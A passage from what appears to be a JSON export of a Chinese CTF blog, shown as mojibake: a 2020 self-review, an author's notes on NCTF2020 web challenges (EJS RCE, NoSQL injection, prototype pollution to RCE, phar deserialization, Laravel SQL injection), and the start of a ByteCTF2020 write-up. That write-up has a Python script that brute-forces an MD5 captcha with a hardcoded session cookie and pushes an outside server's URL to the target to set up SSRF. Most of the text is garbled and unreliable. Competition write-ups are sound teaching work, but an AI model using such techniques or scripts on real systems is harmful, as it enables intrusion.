æ‰€çŸ¥åˆ°èƒ½æœ‰æ‰€è¾“å‡ºäº†ã€‚äººæ€»å½’æ˜¯è¦è¿›æ­¥çš„ï¼Œä»˜å‡ºæœ‰å›æŠ¥æ‰æ˜¯æˆ‘ä¸ªäººçš„ä¿¡æ¡ã€‚æ‰€ä»¥æ¥ä¸‹æ¥çš„ä¸€å¹´ä¹Ÿè¦ç»§ç»­åŠªåŠ›ï¼Œå®Œæˆè‡ªå·±æœ€åçš„å­¦æœ¯æ¢¦æƒ³å§ XP ä¹‹å‰çœ‹åˆ°éå¸¸å´‡æ‹œçš„æ—¥æœ¬å¸ˆå‚…å†™ä¸‹çš„è‡ªçœä¸æŠ±è´Ÿï¼Œè®©æˆ‘è§‰å¾—æ¥ä¸‹æ¥ä¹Ÿéœ€è¦æœ‰è§„åˆ’çš„è¡ŒåŠ¨ã€‚ 2020çš„åçœï¼š äººå˜å¾—æ‡’æƒ°äº†ï¼Œä¹Ÿè®¸æ˜¯ç–«æƒ…çš„å½±å“ï¼Œä½†æ˜¯ç¡®å®å½±å“äº†æ•ˆç‡ å­¦golangï¼Œä»¥åŠå†™ä¸€äº›javaé¡¹ç›®çš„flagæ²¡æœ‰æ‹”æ‰ é”»ç‚¼å°‘äº†ï¼Œå°‘äº†è·‘æ“åå…‰é æ‰“ç¯®çƒä»ç„¶ä¼šæ„Ÿå—åˆ°èº«ä½“æœºèƒ½çš„å¤§å¹…ä¸‹é™ å»å›¾ä¹¦é¦†å°‘äº†ï¼Œçœ‹ä¹¦æœ¬å­¦ä¹ çš„å¿ƒæ€å˜å¾—æµ®èº ä¸Šè¯¾æ‘¸é±¼å¤ªå¤šï¼ˆæ°´è¯¾é™¤å¤–ï¼‰ 2021çš„æŠ±è´Ÿï¼š å¼€å‘ï¼štypescripté¡¹ç›®çš„å®Œæˆï¼Œgolangçš„å­¦ä¹ ,javaçš„è¿›ä¸€æ­¥å­¦ä¹  ç®—æ³•ï¼šåˆ·leetcode é”»ç‚¼ï¼šä¿è¯èº«ä½“å¥åº·ï¼Œäº‰å–å®šæœŸé•¿è·‘ä¸€æ¬¡ ç§‘ç ”: äº‰å–èƒ½æœ‰æ‰€äº§å‡ºï¼Œè‡³å°‘ä¸è¦åšåˆ°æ¯«æ— è¿›å±• å°è¯•ä¸€äº›å¤æ‚çš„æ¼æ´è„šæœ¬ç¼–å†™ï¼Œä¸Šçº¿åˆ°github ä¿ç ”åˆ°å¿ƒä»ªçš„é™¢æ ¡ å¦‚æœæˆäº†ï¼Œä¸‹åŠå¹´å†²å„ç§CTF","categories":[],"tags":[]},{"title":"NCTF2020-å‡ºé¢˜å°è®°","slug":"NCTF2020-å‡ºé¢˜å°è®°","date":"2020-11-11T13:09:25.000Z","updated":"2021-02-18T05:09:40.104Z","comments":true,"path":"2020/11/11/NCTF2020-å‡ºé¢˜å°è®°/","link":"","permalink":"https://www.bycsec.top/2020/11/11/NCTF2020-%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/","excerpt":"","text":"nctf2020ç»ˆäºç»“æŸäº†ã€‚æˆ‘æ‰‹å¤´çš„é¢˜ç›®ä¹ŸåŸºæœ¬æ— äº† XDå› ä¸ºè¿™æ¬¡nctfå­¦é•¿ä»–ä»¬è¦æ¥çš„å¥–åŠ±æŒºä¸°åšçš„(xray licenseæˆ‘ä¹Ÿæƒ³è¦å•Š),æ‰€ä»¥å°±æŠŠæ‰‹å¤´çš„é¢˜éƒ½æ”¾å‡ºæ¥äº†ã€‚å¦‚æœéš¾åº¦å¯¹æ–°ç”Ÿæœ‰äº›åŠé€€çš„è¯è¿˜è¯·å¤šå¤šåŒ…æ¶µã€‚æ ¡èµ›å‰å‡ å¤©ï¼Œç”šè‡³ä»¥ä¸ºyyplè¦æ¥å°±ä¸´æ—¶èµ¶å‡ºäº†ä¸€é“bg_laravel,ç»“æœè¢«å¿½æ‚ äº†ã€‚æœ€åå¤§éƒ¨åˆ†å¸ˆå‚…å¯èƒ½éƒ½å»åšç¥¥äº‘æ¯äº†ï¼Œæ‰€ä»¥æ²¡èƒ½è¿‡æ¥æ‰“ï¼Œç®—æ˜¯æ¯”è¾ƒå¯æƒœäº†ã€‚ è¿™æ¬¡æˆ‘çš„é¢˜ç›®é™¤äº†bg_laravelä»¥å¤–å…¨éƒ½æœ‰äººè§£å‡º.(rmbå¸ˆå‚…è¿˜æœ‰å…¶ä»–å¸ˆå‚…tql)é¢˜ç›®ç¯å¢ƒæ”¾githubä¸Šäº†,å¯ä»¥è‡ªå–å¤ç°ã€‚https://github.com/baiyecha404/My-NCTF2020-Challs JS-world [11 solves]è¿™é“æ˜¯ä¸“é—¨ä¸ºæ ¡èµ›å‡†å¤‡çš„ç­¾åˆ°é¢˜ç›®ã€‚æ•´ä½“æ€æƒ³ä¸Šå…¶å®å°±æ˜¯æƒ³å±•ç¤ºä¸‹jsåœ¨å‰åç«¯çš„é€šç”¨æ€§ã€‚åªè¦ç†è§£äº†å‰ç«¯æºç å°±èƒ½æ¨æ–­åç«¯é€»è¾‘ã€‚åŒæ—¶ä¹Ÿæƒ³è¯´æ˜å‰ç«¯çš„wafç­‰äºæ²¡æœ‰waf :).åŠ ä¸Špowered by ejsçš„æç¤º,åº”è¯¥ä¸éš¾çœ‹å‡ºç”¨çš„æ˜¯ejsæ¥æ¸²æŸ“htmlä»£ç ã€‚é‚£ä¹ˆç›´æ¥ç”¨ejsçš„è¯­å¥å°±å¯ä»¥RCEäº†. æ¯”èµ›çš„æ—¶å€™æœ¬æ¥ä¸€è¡€å¾ˆå¿«å°±å‡ºäº†çš„ï¼Œç»“æœåæ¥åŠå¤©æ²¡äººè§£ã€‚æˆ‘çœ‹äº†çœ¼htmlå‘ç°æœ‰çš„å¸ˆå‚…å·²ç»å¯ä»¥RCEäº†ç»“æœå°±æ˜¯ä¸å»çœ‹æ ¹ç›®å½•çš„flag.txt.é˜¿è¿™â€¦â€¦ Mango [3 solves]Mango è‡ªç„¶æ˜¯ä¸ºäº†ç©ä¸€ä¸ªmongo &lt;-&gt; mangoçš„æ¢—ã€‚è¿™é“é¢˜çš„èµ·æºæ¯”è¾ƒæœ‰æ„æ€ï¼Œæ¥è‡ªäºä¸ŠåŠå¹´æŸå›½é™…èµ›çš„èµ›é¢˜ã€‚å½“æ—¶é¢˜ç›®è€ƒç‚¹æ˜¯node-serializeçš„ååºåˆ—åŒ–,ä¸è¿‡æˆ‘åœ¨é»‘ç›’æµ‹çš„æ—¶å€™æ„å¤–å‘ç°é‚£é“é¢˜ç›®è¿˜æœ‰nosqlæ³¨å…¥çš„æ¼æ´å­˜åœ¨ã€‚äºæ˜¯åæ¥getshellåç´¢æ€§dumpæºç ä¸‹æ¥ç ”ç©¶äº†ä¸‹ï¼Œä¹Ÿå¤§è‡´æ˜ç™½äº†ä¸ºä»€ä¹ˆä»–çš„é…ç½®ä¼šäº§ç”Ÿnosqlæ³¨å…¥ã€‚åŠ ä¸Šåæ¥å‘ç°è¿™æ ·çš„ä»£ç å†™æ³•å…¶å®è¿˜æŒºå¸¸è§çš„ï¼Œæ‰€ä»¥å¹²è„†å•ç‹¬å‰¥å‡ºæ¥åšæˆnosqlæ³¨å…¥äº†ã€‚ ä½†æ˜¯æˆ‘çš„å®šä½åªæ˜¯ä¸­ç­‰éš¾åº¦ï¼Œæœ€ååªæœ‰3 solvesæˆ‘ä¹Ÿå¾ˆè¿·ã€‚ä¸çŸ¥é“æ˜¯å› ä¸ºå¤§å®¶æ²¡æœ‰æ¥è§¦è¿‡nosqlæ³¨å…¥è¿˜æ˜¯ä»€ä¹ˆçš„ã€‚æˆ‘ç°åœ¨è§è¿‡çš„å¤§éƒ¨åˆ†nodejså†™çš„é¡¹ç›®æ•°æ®åº“éƒ½æ˜¯ç”¨çš„mongodb,æ„Ÿè§‰å‡ºç°nosqlçš„æ¦‚ç‡è¿˜æ˜¯ä¸å°çš„ã€‚ç¨å¾®éœ€è¦æ›´æ¢æ–¹å¼fuzzçš„åœ°æ–¹å°±æ˜¯jsonä¼ é€’æ•°æ®äº†ã€‚è¿™ä¸ªä¹Ÿç®—æ˜¯æ¯”è¾ƒå¸¸è§çš„trickå§,nodeç”±äºä¼ é€’jsonå¯¼è‡´ä¸å¯¹è±¡æ··æ·†çš„é—®é¢˜ç®€ç›´ä¸è¦å¤ªå¤šã€‚æ‰€ä»¥ç¬¬äºŒä¸ªæç¤ºç»™å‡ºäº†app.use(express.json())ã€‚æ‰‹æŠ–åŠ ä¸€ä¸ªjsonä¸­é—´ä»¶æˆ–è€…å› ä¸ºæŸä¸ªéœ€æ±‚ä¸å¾—ä¸åŠ ä¸­é—´ä»¶(å†™apiæ—¶),å¾ˆæœ‰å¯èƒ½å¸¦æ¥å¥‡æ€ªçš„é—®é¢˜ã€‚æ‰€ä»¥å†™nodeä¼ å‚ä¸€å®šè¦è®°å¾—ç±»å‹æ£€æŸ¥å•Šã€‚ PackageManager v1.0/v2.0 [7 solves / 3 solves]PackageManager ç³»åˆ—æ”¾äº†ä¸¤é“é¢˜ã€‚å…¶å®æºç åŸºæœ¬ç›¸å·®ä¸å¤§ï¼Œ2å°±æ˜¯1çš„å‡çº§ç‰ˆã€‚ä¸€å¼€å§‹çš„PackageManager 6æœˆä»½å°±å‡ºå¥½äº†ã€‚ä¸è¿‡åæ¥è¿‡äº†å‡ ä¸ªæœˆåæ„å¤–å‘ç°å±…ç„¶å­˜åœ¨éé¢„æœŸã€‚äºæ˜¯ç´¢æ€§å°±æŠŠéé¢„æœŸæ”¾åˆ°ç¬¬äºŒç‰ˆé‡Œå¹¶ä¸”åŠ éš¾äº†ã€‚è€ƒç‚¹å…¶å®æ˜¯æˆ‘è§‰å¾—å¾ˆå€¼å¾—å»å­¦ä¹ çš„ç”¨å­è¿›ç¨‹æ¥prototype pollution to RCEçš„ä¸€ç§æ‰‹æ®µ.ç›¸æ¯”æ·±æŒ–æ¨¡æ¿æ±¡æŸ“å±æ€§çš„åˆ©ç”¨æ–¹æ³•ï¼Œå­è¿›ç¨‹å¯¼è‡´RCEç®—æ˜¯å¤§å¤§é™ä½äº†åˆ©ç”¨éš¾åº¦ã€‚ç„¶è€Œå›½å†…ç›¸å…³æ–‡ç« è²Œä¼¼ä¸»è¦æ˜¯å…ˆçŸ¥ä¸Šçš„ä¸€ç¯‡kibana cveåˆ†æ,ä¸è¿‡å°±å­è¿›ç¨‹åˆ©ç”¨èŒƒå›´ä¸Šæœ‰äº›å·®é”™ã€‚æ‰€ä»¥å¸Œæœ›å€Ÿæ­¤è®©å¤§å®¶é‡æ–°å…³æ³¨ä¸‹ã€‚ å½“ç„¶ï¼Œåæ¥æ„å¤–å‘ç°è¿™ä¸ªè€ƒç‚¹ç¬¬5ç©ºé—´çº¿ä¸‹è²Œä¼¼ä¹Ÿå‡ºç°è¿‡,ä¸è¿‡æˆ‘é¢˜ç›®å…ˆå‡ºå¥½çš„233ã€‚ v2é™¤äº†è¾¾æˆRCEä»¥å¤–,ä¸ºäº†å¢åŠ ä¸€ç‚¹éš¾åº¦ï¼Œç‰¹æ„å°±æŠŠflagæ”¾åˆ°mongodbä¸­äº†ã€‚è¿™ç‚¹æ ¹æ®hint.txtä»¥åŠç›®å½•ä¸‹çš„æ–‡ä»¶æ¥æ¨æ–­åº”è¯¥ä¸æˆé—®é¢˜ã€‚å…¶å®ç›®çš„æ˜¯æ¨¡æ‹Ÿä¸€ä¸ªå¼€å‘ä¸Šçº¿åˆ°ç”Ÿäº§ç¯å¢ƒçš„æƒ…æ™¯ã€‚æ¯”å¦‚åƒæˆ‘è¿™æ ·,å®¹æ˜“è£…äº†æŸä¸ªä¾èµ–å†™ä¸ªdemoï¼Œç„¶åå­—æ®µç•™åˆ°package.jsoné‡Œäº†,æœ¬åœ°åˆ äº†ç›¸å…³jsä»£ç åæ‹¿åˆ°ç”Ÿäº§ç¯å¢ƒä¸‹ç›´æ¥npm install ,å°±å¤šè£…äº†æ²¡æœ‰ç”¨çš„ä¾èµ–ã€‚æ‰€ä»¥è¿™é‡Œå°±èƒ½ç”¨mongodbä¾èµ–è¿æ¥å†…ç½‘mongodbæ‹¿flag. ç„¶åæ¯”èµ›å°±ç¿»è½¦äº†â€¦â€¦nunjucksæŠŠæˆ‘ç»™å®³äº†ã€‚ä¹‹æ‰€ä»¥é€‰nunjucksåšæ¨¡æ¿å¼•æ“æœ¬æ¥æ˜¯å› ä¸ºæˆ‘æ‰€çŸ¥é“çš„å¼•æ“é™¤äº†nunjuckså¤–ï¼Œåƒhbs,ejs,pug,jadeéƒ½æ˜¯å¯ä»¥æ±¡æŸ“æ¨¡æ¿RCEçš„ã€‚æ‰€ä»¥æ²¡æœ‰è·Ÿæºç å°±ç›´æ¥æƒ³çœ‹çœ‹æœ‰æ²¡æœ‰äººéé¢„æœŸæ±¡æŸ“nunjuckså±æ€§çš„ï¼ˆp1g3å¸ˆå‚…åº”è¯¥æ˜¯æ‰¾äº†nunjucksçš„æ±¡æŸ“ï¼Œä½†æ˜¯åªèƒ½ç­‰æˆ‘é¶æœºæ¯åˆ†é’Ÿé‡å¯æ‰èƒ½çœ‹ä¸€æ¬¡æ‰§è¡Œç»“æœ,æ²¡æœ‰é¢„æœŸè§£æ–¹ä¾¿ï¼‰ã€‚ç»“æœå‘ç°nunjucksç›´æ¥æ¨¡æ¿æ³¨å…¥æ ¹æœ¬ä¸å—è¿™äº›å½±å“â€¦â€¦ æˆ‘v2æœ¬æ¥ç›®çš„å°±æ˜¯è¯´æ˜å…¶å®ä¸æ­¢fork,ä»»æ„å­è¿›ç¨‹éƒ½å¯ä»¥ç»“åˆæ±¡æŸ“ç¯å¢ƒå˜é‡ç„¶åRCE,æ‰€ä»¥å°±ç”¨äº†execSync(&#39;whoami&#39;)ã€‚ä¸­é—´ä»¶é‡Œè¿˜è€ƒå¯Ÿäº†ä¸€ä¸ªtrickç»•è¿‡debugè·¯ç”±çš„é™åˆ¶.ç»“æœæ¨¡æ¿æ³¨å…¥ç›´æ¥é€šæ€v1,v2 orz ä¸è¿‡è²Œä¼¼çœ‹v2çš„äººä¸å¤šï¼Œæ‰€ä»¥æœ€årmbè·Ÿp1g3å¸ˆå‚…åº”è¯¥æ˜¯é¢„æœŸåšçš„ã€‚ä¸€è¡€çš„Somnuså¸ˆå‚…å°±ç›´æ¥éé¢„æœŸæ¨¡æ¿æ³¨å…¥äº†â€¦â€¦ä¸è¿‡éé¢„æœŸä»€ä¹ˆçš„æ— æ‰€è°“,èƒ½æ‹¿flagéƒ½æ˜¯å¥½æ–¹æ³•,å¤§å®¶èƒ½å­¦åˆ°å­è¿›ç¨‹æ±¡æŸ“çš„çŸ¥è¯†æˆ‘å°±æ¯”è¾ƒæ»¡è¶³äº†ã€‚æœ€åæ¯”è¾ƒæ™®éçš„é—®é¢˜æ˜¯æœ‰çš„å¸ˆå‚…è¿æ¥mongodbä»£ç å†™å¥½åæ²¡æœ‰db.close().é‚£è¿™æœ¬åœ°å¿…ç„¶æ˜¯æ‹¿ä¸åˆ°æŸ¥è¯¢ç»“æœçš„ã€‚ SimpleSimplePie [1 solves]æŒ–é“¾å­æ˜¯ä¸å¯èƒ½çš„ï¼Œæ‰€ä»¥åªèƒ½è‡ªå·±æ‰‹å†™å‡ ä¸ªä¹±ä¸ƒå…«ç³Ÿçš„ç±»æ¥æ„é€ popé“¾äº†ã€‚æ•´ä½“æ€è·¯æˆ‘æ„Ÿè§‰è·Ÿtpç³»åˆ—çš„pop chain å·®ä¸å¤šï¼Ÿå°±æ˜¯ä¸ªsuper-miniç‰ˆçš„__toString() -&gt; __call() -&gt; call_user_funcè°ƒç”¨è‡ªèº«å‡½æ•°ã€‚ ç„¶ååˆ©ç”¨åˆ™æ¯”è¾ƒæœ‰æ„æ€ã€‚çµæ„Ÿå½“ç„¶å°±æ˜¯ä¹‹å‰åšhtbæ—¶å‘ç°çš„æ–°å§¿åŠ¿ ssrf æ‰“memcacheè§¦å‘ååºåˆ—åŒ–. åæ¥æ„å¤–å‘ç°è¿™æ ·çš„åˆ©ç”¨å…¶å®å®æˆ˜ä¸­è¿˜æŒºä¸å°‘çš„ï¼Œæ¯”å¦‚ä¹‹å‰å®‰æ’ä¿Šæ°å¸ˆå‚…çš„ssrf -&gt; RCEçš„è‰°éš¾åˆ©ç”¨å°±æ˜¯ssrf æ‰“redisè§¦å‘thinkphpååºåˆ—åŒ–.æˆ‘çš„é¢˜ç›¸æ¯”å®æˆ˜è¿˜æ˜¯ç®€å•å¤šäº†ã€‚ è¿™é‡Œpopé“¾é‡Œæœ‰ä¸ªå°å‘å°±æ˜¯é“¾å­çš„èµ·ç‚¹é€‰__wakeupæœ€å¥½ã€‚æˆ‘è‡ªå·±å½“åˆè°ƒè¯•çš„æ—¶å€™å°±å‘ç°å¦‚æœç”¨__destructåšèµ·ç‚¹ï¼Œä¼šå› ä¸ºåºåˆ—åŒ–æ•°æ®çš„ä¸€äº›å†…å®¹è§¦å‘simplepieçš„æŠ¥é”™ã€‚æ‰€ä»¥å†™åˆ©ç”¨ç±»æ—¶æ•…æ„åˆéš¾åŠ äº†ä¸ª__destructå¸Œæœ›è¸©ä¸ªå‘(æˆ‘çˆ¬äº†)ã€‚ä½†æ˜¯å”¯ä¸€è§£å‡ºçš„rmbå¸ˆå‚…åœ¨é€‰æ‹©äº†__destructåšèµ·ç‚¹åæ˜¯ç”¨äº†phpggcé‡Œçš„fast destruct æ¥è¿›å…¥__destructã€‚è¿™å€’ç¡®å®å‡ºä¹æˆ‘æ„æ–™,å­¦åˆ°äº†ã€‚ bg_laravel [0 solves]æ²¡æƒ³åˆ°æœ€ålaravelæˆäº†é˜²aké¢˜â€¦â€¦å› ä¸ºæ—¶ä¸´æ—¶èµ¶çš„ï¼Œæ‰€ä»¥å¾ˆå¤šåœ°æ–¹å†™çš„ä¸æ˜¯å¾ˆå¥½ï¼Œè¿˜è¯·è§è°…ã€‚ç”šè‡³ç”±sqlæ³¨å…¥åˆ°ä¸Šä¼ getshelléƒ½æ˜¯çµå…‰ä¸€é—ªæƒ³å‡ºæ¥çš„ã€‚ é¢˜ç›®ä¹‹æ‰€ä»¥ç”¨äº†ä¿å›½å½“ç„¶æ˜¯å› ä¸ºæœ€è¿‘è¢«é©¬è€å¸ˆçš„é¬¼ç•œç»™æ´—è„‘äº†233ã€‚æ‰€ä»¥æˆ‘çš„é¢˜ç›®ä¸Šä¼ ä¸ç»™å›æ˜¾è·¯å¾„ï¼Œå…¶å®æ˜¯å¹´è½»äººä¸è®²æ­¦å¾·ä¸å‘Šè¯‰ä½ æ–‡ä»¶å :) é¦–å…ˆåœ¨å›½å†…CTF laravelçš„ååºåˆ—åŒ–æ—©å°±è¢«æ‰“çƒ‚äº†ï¼Œæ‰€ä»¥æˆ‘å°±æƒ³èƒ½ä¸èƒ½å‡ºç‚¹æ–°æ„ã€‚è¯´èµ·æ¥ä¹‹å‰ä¸ƒæœˆç«å¸ˆå‚…çš„laravelæ–‡ç« ä¸‹å±…ç„¶æœ‰äººè¯´æ²¡äººè¿™ä¹ˆå†™æ§åˆ¶å™¨æ‰€ä»¥ååºåˆ—åŒ–æ²¡æœ‰ç”¨ï¼Œè¿™å°±æ¥æ‰“è„¸ã€‚ä¼—æ‰€å‘¨çŸ¥,pharååºåˆ—åŒ–ç›´æ¥æ‰©å®½äº†phpååºåˆ—åŒ–çš„åˆ©ç”¨é¢ã€‚ä¸€ä¸ªlaravelç«™é‡Œå‡ºç°çš„æ–‡ä»¶æµæ“ä½œç»å¯¹ä¸å°‘ï¼Œé‚£ä¹ˆå¦‚æœèƒ½æœ‰å¯æ§ç‚¹è§¦å‘pharååºåˆ—åŒ–,ç»“åˆpopé“¾ç›´æ¥å°±èƒ½getshell. ä½†æ˜¯è¿™ä¹ˆè€ƒå¤ªç®€å•äº†ï¼Œæ‰€ä»¥è‡ªç„¶æ˜¯åŠ ç‚¹èŠ±ã€‚ åˆšå¥½æˆ‘æœ€è¿‘æ¥è§¦åˆ°äº†laravel 5.8.10çš„å¾ˆå†·é—¨çš„sqlæ³¨å…¥ã€‚å†·é—¨ä¸»è¦æ˜¯å› ä¸ºgithubä¸Šä¿®å¤éƒ½åªæ˜¯è¯´ä¿®å¤äº†é€ƒé€¸å•å¼•å·çš„æ¼æ´,è€Œä¸æ˜¯æ˜è¯´çš„sqlæ³¨å…¥æ¼æ´ã€‚è€Œä¸”åˆ©ç”¨æ¡ä»¶ä¹Ÿæœ‰ç‚¹è‹›åˆ»ï¼Œä¸€ä¸ªæ˜¯è¦è¾“å…¥å¯æ§,å¦ä¸€ä¸ªæ˜¯å›æ˜¾å¾—æœ‰jsonæ•°æ®,å¦åˆ™json_extract()ä¼šæŠ¥é”™ã€‚wpé‡Œç»™çš„å‚è€ƒæ–‡ç« ä¹Ÿåªæ˜¯è¯´äº†addSelect(),select() + jsonå›æ˜¾çš„æ•°æ®å¯èƒ½ä¼šå¯¼è‡´sqlæ³¨å…¥ã€‚å¯å®é™…ä¸Šï¼Œé¢˜ç›®ä¸­å‡ºç°çš„orderby()ä¹Ÿæ˜¯å¯ä»¥æ³¨å…¥çš„ã€‚è¿™å°±è¦çœ‹å¸ˆå‚…ä»¬è‡ªå·±debugäº†ã€‚æˆ‘è‡ªå·±æ˜¯å½“åˆç›´æ¥wrapJsonPathé‚£ä¸‹æ–­ç‚¹ç¢°è¿æ°”åœ¨å¯æ§ä½ç½®ä¸€ä¸ªä¸ªå°è¯•è§¦å‘æ‰å‘ç°çš„ã€‚ sqlæ³¨å…¥æ€ä¹ˆè·Ÿpharååºåˆ—åŒ–ç»“åˆå‘¢ï¼Ÿé™¤å¼€å¯æ§çš„phar://è¾“å…¥ç‚¹ï¼Œæˆ‘ç¬¬ä¸€æƒ³æ³•æ˜¯æŠŠä¸Šä¼ çš„æ–‡ä»¶åéšæœºåŒ–ï¼Œç„¶åæŠŠæ–‡ä»¶åä¹‹ç±»çš„ä¿å­˜åœ¨mysqlé‡Œã€‚ä½†æ˜¯å¾ˆæœ‰æ„æ€çš„æ˜¯ï¼Œæˆ‘åœ¨ç½‘ä¸Šæ‰¾äº†ä¸å°‘laravelçš„æ–‡ä»¶ä¸Šä¼ éƒ½ç”¨äº†ORM,ä¹Ÿå°±æ˜¯è¯´,Fileç±»æ˜¯ä¸ªEloquent model.æ‰§è¡Œ$file-&gt;save()æ—¶å¯¹åº”çš„æ•°æ®å°±éƒ½åˆ°äº†æ•°æ®åº“é‡Œäº†,æ­£åˆæˆ‘æ„ã€‚ æ‰€ä»¥å¯èƒ½å¤§éƒ¨åˆ†å¸ˆå‚…è¢«è¿™ä¸ªå†·é—¨çš„laravel sqlæ³¨å…¥ç»™éš¾ä½äº†ã€‚æ‰€ä»¥è¿˜æ˜¯è¦å¤šè°·æ­Œ+æŸ¥çœ‹å®˜æ–¹è¿™ä¸ªç‰ˆæœ¬çš„ä¸€äº›å°æ”¹åŠ¨,è¯´ä¸å®šå°±èƒ½å®šä½æ¼æ´ç‚¹äº†ã€‚ summary æ€»ä¹‹è¿™æ¬¡æ¯”èµ›èƒ½çœ‹åˆ°å¸ˆå‚…ä»¬åšè‡ªå·±çš„é¢˜,é¡ºä¾¿äº¤æµä¸‹æ€è·¯è¿˜æ˜¯æ¯”è¾ƒå¼€å¿ƒçš„ã€‚å¸Œæœ›å¤§å®¶æ˜å¹´èƒ½æ¥ç€æ¥ç©ï¼Œä¹Ÿå¯ä»¥æœŸå¾…ä¸‹ä¸çŸ¥é“æœ‰æ²¡æœ‰çš„X1CTF","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"}]},{"title":"ByteCTF2020-easyscrapy","slug":"ByteCTF2020-easyscrapy","date":"2020-10-26T00:39:02.000Z","updated":"2021-02-18T05:08:51.736Z","comments":true,"path":"2020/10/26/ByteCTF2020-easyscrapy/","link":"","permalink":"https://www.bycsec.top/2020/10/26/ByteCTF2020-easyscrapy/","excerpt":"è¿™æ¬¡ByteCTFçš„webé¢˜éš¾åº¦å±å®ç¦»è°±ã€‚å¥½å‡ é“é¢˜å‡ ä¹éƒ½æ— æ³•ä¸‹æ‰‹ã€‚è‡ªå·±ç¬¬ä¸€å¤©ä¸»è¦æ˜¯çœ‹äº†easyscrapyä»¥åŠé…äº†beakerçš„ç¯å¢ƒ(ç»“æœæ ¹æœ¬æ“ä½œä¸èµ·æ¥ï¼Œäºæ˜¯æ”¾å¼ƒäº†â€¦â€¦)ç¬¬äºŒå¤©ä¸Šåˆåœ¨é…scrapyçš„ç¯å¢ƒï¼Œä¸€ç›´åˆ°ä¸‹åˆæ‰å‡ºæ€è·¯,åŸºæœ¬ä¸Šç»™æˆ‘å‡ å°æ—¶å°±èƒ½å‡ºäº†ã€‚ç„¶è€Œå› ä¸ºè¦èµ¶é£æœºç»“æœæ²¡æ—¶é—´åšäº†â€¦â€¦æ™šä¸Šåˆ°äº†åæ€»å½’æ˜¯æŠŠé¢˜ç›®åšå‡ºæ¥äº†ã€‚åªèƒ½è¯´æœ‰ç‚¹å¯æƒœï¼Œä¸ç„¶å¯ä»¥ä¸ºå°ç»¿è‰æ‹¿ä¸ªä¸‰/å››è¡€çš„ã€‚ è¿™é‡Œæˆ‘åˆ†äº«ä¸‹è‡ªå·±ä¸€è·¯ä¸‹æ¥çš„ä¸»è¦æ€è·¯å§ã€‚å¸Œæœ›èƒ½å¯¹ä»–äººæœ‰æ‰€å¸®åŠ©ã€‚å¦å¤–å†™æ–‡ç« æ—¶ç¯å¢ƒå·²ç»å…³äº†ï¼Œæ²¡å•¥å›¾ï¼Œå°†å°±ç€çœ‹å§","text":"è¿™æ¬¡ByteCTFçš„webé¢˜éš¾åº¦å±å®ç¦»è°±ã€‚å¥½å‡ é“é¢˜å‡ ä¹éƒ½æ— æ³•ä¸‹æ‰‹ã€‚è‡ªå·±ç¬¬ä¸€å¤©ä¸»è¦æ˜¯çœ‹äº†easyscrapyä»¥åŠé…äº†beakerçš„ç¯å¢ƒ(ç»“æœæ ¹æœ¬æ“ä½œä¸èµ·æ¥ï¼Œäºæ˜¯æ”¾å¼ƒäº†â€¦â€¦)ç¬¬äºŒå¤©ä¸Šåˆåœ¨é…scrapyçš„ç¯å¢ƒï¼Œä¸€ç›´åˆ°ä¸‹åˆæ‰å‡ºæ€è·¯,åŸºæœ¬ä¸Šç»™æˆ‘å‡ å°æ—¶å°±èƒ½å‡ºäº†ã€‚ç„¶è€Œå› ä¸ºè¦èµ¶é£æœºç»“æœæ²¡æ—¶é—´åšäº†â€¦â€¦æ™šä¸Šåˆ°äº†åæ€»å½’æ˜¯æŠŠé¢˜ç›®åšå‡ºæ¥äº†ã€‚åªèƒ½è¯´æœ‰ç‚¹å¯æƒœï¼Œä¸ç„¶å¯ä»¥ä¸ºå°ç»¿è‰æ‹¿ä¸ªä¸‰/å››è¡€çš„ã€‚ è¿™é‡Œæˆ‘åˆ†äº«ä¸‹è‡ªå·±ä¸€è·¯ä¸‹æ¥çš„ä¸»è¦æ€è·¯å§ã€‚å¸Œæœ›èƒ½å¯¹ä»–äººæœ‰æ‰€å¸®åŠ©ã€‚å¦å¤–å†™æ–‡ç« æ—¶ç¯å¢ƒå·²ç»å…³äº†ï¼Œæ²¡å•¥å›¾ï¼Œå°†å°±ç€çœ‹å§ fuzzé¦–å…ˆé¢˜ç›®æœ¬èº«ç»™å‡ºäº†ä¸€ä¸ªåŠŸèƒ½å¯ä»¥è®©æˆ‘ä»¬è¾“å…¥urlä»¥åŠä¸€ä¸ªéªŒè¯ç ï¼Œä½†æ˜¯æ³¨æ„åˆ°è¿™é‡Œcookieæ˜¯flaskçš„session,å­˜å‚¨çš„å†…å®¹ä¸æ¯æ¬¡é¡µé¢å›æ˜¾çš„éªŒè¯ç ä¸€è‡´ã€‚æ‰€ä»¥é¦–å…ˆæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°å‡å°‘åé¢çš„å·¥ä½œçš„æ–¹æ³•,å°±æ˜¯å¸¦ä¸Šå›ºå®šçš„cookieå†™è„šæœ¬è¿›è¡Œå­˜å‚¨urlçš„æ“ä½œã€‚ 12345678910111213141516171819202122232425262728293031323334353637import string, hashlibimport requestsimport reimport sysimport timeURL='http://39.102.69.151:30010/'cookies=&#123;'session':'eyJjb2RlIjoiZTFiMmQ5IiwidXNlciI6IjVhNTkwZjVhLTE2ZjgtMTFlYi1hYThhLTAyNDJhYzE0MDAwNiJ9.X5XSBA.z2Nn4le-aOsM8jg82j7gMzfzhSc'&#125;def brute(code): a = string.digits + string.ascii_lowercase + string.ascii_uppercase for i in a: for j in a: for k in a: for m in a: for n in a: p = i + j + k + m + n s = hashlib.md5(p.encode('utf-8')).hexdigest()[0:6] if s == code: print(p) return pdef send(): r=requests.get(URL,cookies=cookies) varify=re.findall(r'&lt;span&gt;substr\\(md5\\(\\$str\\), 0, 6\\) === (.*)&lt;/span&gt;',r.text)[0] return varifydef push(url,code): r=requests.post(url=URL+'push',cookies=cookies,data=&#123;'url':url,'code':code&#125;) print(r.text)#code=brute(send())#print(code)push('http://120.27.246.202/',code)#push('http://127.0.0.1:','0AUDp') çˆ†ç ´ä¸€æ¬¡åå°±å¯ç»§ç»­ç”¨äº†ã€‚ ä¹‹åå‘ç°ï¼Œå½“è¾“å…¥å®Œurlå­˜å‚¨åï¼Œurllistä¸­ä¼šå­˜åœ¨æˆ‘ä»¬åˆšåˆšè¾“å…¥çš„urlã€‚ä¹‹åç‚¹å‡»åˆ™ä¼šå‰å¾€/result?url=xxxx.ä¼¼ä¹æ˜¯ä¸€ä¸ªssrfçš„ç‚¹ã€‚ 